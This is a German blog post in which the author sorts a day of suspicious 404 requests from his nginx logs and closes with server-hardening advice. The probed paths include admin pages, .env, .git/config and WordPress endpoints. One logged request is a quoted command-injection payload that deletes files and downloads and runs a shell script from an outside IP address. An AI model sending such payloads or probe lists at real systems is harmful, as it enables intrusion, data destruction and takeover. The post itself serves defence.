---
title: Scannen von häufigen Pfaden auf Webservern
filename: webserver_scanning
date: 2024-02-13T17:55:02+01:00
update-date:
tags: webserver, nginx, security, mongodb
category: hoellenmaschinen
summary: Auf meinem Server werden regelmäßig verdächtige URLs angefragt. Was hat es damit auch sich?
image:
language:
---

Ein Bekannter von der Uni hat neulich im internen Chat etwas geposted. Und zwar hat er eine ungesicherte MongoDB-Instanz ins Netz gestellt, weil er kurz etwas ausprobieren wollte. Zehn (!) Minuten später waren die Daten weg und nur eine Erpressermitteilung (à la „Your data has been backed up, pay 0.005 BTC to get them back“) war noch zu finden. Nun war das ein Testsystem für Sicherheitstests, und die Daten waren weder sensibel noch wichtig. Sonst hätte der die Datenbank auch nicht ins Netz gestellt. Aber von der Geschwindigkeit waren wir dann doch überrascht.

### Scans auf meinem Webserver

Das hat mich dann wieder daran erinnert, dass ich auch auf meinem Webserver (auf dem dieses Blog hier läuft) regelmäßig Fehler im Log finde, das irgendwelche obskuren Seiten nicht gefunden wurden. Das war [schon vor zwölf Jahren so](/blogposts/old_1960580) (und der Webserver damals lief nur standardmäßig, den habe ich dann bis zum Start dieses Blogs abgeschaltet), und es ist immernoch so. Ich logge ja nicht viel (Datenschutz), aber zumindest _welche_ Fehler der nginx so hat, logge ich dann doch.

Also habe ich mir ein kleines script geschrieben, um einfach mal diese Logdateien auszuwerten. Es wurden an einem Tag 131 eindeutige, ungültige Pfade angefordert. Die habe ich dann gruppiert. Hier eine Übersicht:

#### Fehler meinerseits

Ein paar der Pfade waren definitiv harmlos. Sechs davon gehen auf alte tag-Seiten. Das waren die einzigen Pfade, die ich ersatzlos gestrichen habe (jaja, ich weiß, „[cool URIs don't change](https://www.w3.org/Provider/Style/URI.html)“). Einer davon ging auf einen kaputten Bildpfad, und stammt aus einem `og`-Tag. Das konnte ich reparieren. Alleine dafür hat sich die Sache schon gelohnt.

Ach ja, und `/favicon.ico`, obwohl das favicon dieses Blog woanders liegt. Aber manche Browser fragen einfach immer nach dem alten Standardpfad.

#### Admin-Seiten

Dann gibt es die üblichen scans nach häufigen Pfadnamen für Admin-Seiten, vermutlich in der Hoffnung, eine ungesicherte Seite zu finden. Hier ein paar Beispiele:

```
/admin.asp
/admin.cfm
/admin.cgi
/admin.html
/admin.jhtml
/admin.jsa
/admin.jsp
/webui
```

#### Häufige Pfadnamen

Manches sieht einfach danach aus, also ob man alle möglichen Pfade durchgeht, die eventuell verwundbar sein könnten:

```
/default.asp
/default.aspx
/default.jhtml
/default.jsp
/default.php
/home.asp
/home.aspx
/home.cfm
/home.cgi
/home.pl
/index.asp
/index.html
/index.jsp
/index.pl
/index.shtml
/indice.asp
/indice.aspx
/indice.cfm
/indice.cgi
/indice.html
/indice.jhtml
/indice.jsa
/indice.jsp
/indice.php
/indice.pl
/indice.shtml
```

Gerade diese `index.*`-Dateien listen eventuell auch alle möglichen anderen Dateien im selben Ordner auf, könnten also auch hilfreich für Angreifer sein.

Und dann noch Pfade wie

```
/backup
/new
/old
```

vermutlich in der Hoffnung, vermeintlich gelöschte credentials abgreifen zu können.

`/.env` wurde auch abgerufen, vielleicht weil da öfters mal interessante Konfigurationsdaten drinstehen (z.B. auch wieder credentials).

#### Git-Pfade

Häufig genug wird anscheinend ein git-Repo direkt ins Webverzeichnis gelegt. Ich habe jetzt nicht näher nachgeschaut, was man mit diesen Informationen machen könnte, aber da manchmal sind credentials im git-Repo, oder der Code selber kann Lücken enthalten, oder es sind interessante Informationen in den config-Dateien.

```
/admin/.git/config
/app/.git/config
/application/.git/config
/config/.git/config
/.git/config
/.git/HEAD
/static../.git/config
```

#### Wordpress-Pfade

Wordpress ist immer noch sehr weit verbreitet, und hat historisch ja auch den Ruf, viele Lücken zu haben, oder insbesondere: viele Deployments zu haben, die bei bekannten, behobenen Lücken nicht aktualisiert wurden.

```
/wordpress
/wp
/wp-apxupx.php?apx=upx
/wp-json/acf/v3/options/a?id=wp_mail&field=smtp
//wp-json/wp/v2/posts?per_page=1&_fields=id,slug,comment_status
```

#### Recon-Krams

Bei manchen Dateien scheint es keinen vorrangingen Grund zu geben, warum ein Angreifer versuchen sollte, sie abzurufen. So zum Beispiel:

```
/CSS/Miniweb.css
/static/admin/javascript/hetong.js
/version
```

Ich vermute mal, man kann anhand dieser Dateien darauf schließen, ob eine gewisse, verwundbare Version einer Software auf dem Server läuft oder so.

#### Und was immer das hier ist

Manche Pfade sehen so offensichtlich bösartig aus, dass sie in keine der anderen Kategorien fallen:

```
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F192.3.152.183%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh)
```

#### TLS-Fehler

Unabhängig von den Pfaden habe ich noch einige TLS-Fehler entdeckt. Das muss kein Scan sein. Es kann auch einfach sein, dass irgendein Client die Verbindung verkackt hat. Aber wenn man auf TLS-Lücken scannt, dann erzeugt das normalerweise auch einige Fehlermeldungen.

### Schlussfolgerungen

Das war nur eine sehr oberflächliche Übersicht über die aufgerufenen Pfade. Aber das ist schon interessant genug.

Ich weiß nicht, woher diese Scans kamen. In jedem Fall sind sie höchstwahrscheinlich automatisiert. Es könnten bösartige Angreifer gewesen sein. Oder Sicherheitsforscher. Oder Crawler von Sicherheits-Suchmaschinen, wie z.B. [Shodan](https://www.shodan.io/).

Das macht aber keinen Unterschied. Wichtig ist:

1. Auf _keinen Fall_ ungesicherte Seiten offen im Netz stehen lassen, die dort nicht sein sollten. _Nicht einmal für eine Sekunde_! Nicht einmal für das Setup eines Dienstes! Jedes offene Einfallstor _kann_ und _wird_ gefunden werden.
2. Jede Software, die Kontakt zum Netz hat, regelmäßig updaten. Jede Software, auf die Software zugreift, die Kontakt zum Netz hat, regelmäßig updaten. Wenn du die Software selbst schreibst: Jede Bibliothek regelmäßig updaten. Wenn es Sicherheitspatches gibt? _Am Tag der Veröffentlichung einspielen_!. Wenn ein Scanner eine verwundbare Seite findet, wird jemand diese Schwachstelle ausnutzen.
3. Aufpassen, dass der Webserver korrekt konfiguriert ist und nur Daten aus dem entsprechenden Verzeichnis ausliefert oder, bei dynamischen Seiten, genau das als Code ausführt, was ausgeführt werden soll
4. Keine Daten, die nicht öffentlich sein sollen, in einem Verzeichnis liegen lassen, aus dem Dateien ausgeliefert werden. Dateien wie eine git-Konfiguration oder ein Backup-Ordner können sensible Informationen enthalten.
